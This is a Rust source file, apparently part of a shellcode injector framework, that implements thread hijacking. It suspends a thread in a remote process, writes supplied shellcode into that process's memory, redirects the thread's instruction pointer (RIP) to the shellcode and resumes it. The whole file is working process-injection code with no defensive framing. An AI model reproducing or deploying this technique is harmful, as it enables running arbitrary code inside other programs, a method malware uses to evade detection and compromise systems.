use crate::wrappers::{
    RemoteAllocator as _,
    RemoteProcess
};

use super::ExecutionMethod;

pub(super) struct ThreadHijackingExecutor;

impl ExecutionMethod for ThreadHijackingExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let mut remote_thread = remote_process.get_remote_thread()?;
        remote_thread.suspend()?;

        let mut context = remote_thread.get_context()?;

        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;
        remote_process.flush_icache(shellcode_mem, shellcode_to_exec.len())?;

        context.get_mut().Rip = shellcode_mem as u64;

        remote_thread.set_context(&context)?;

        remote_thread.resume()?;

        Ok(())
    }
}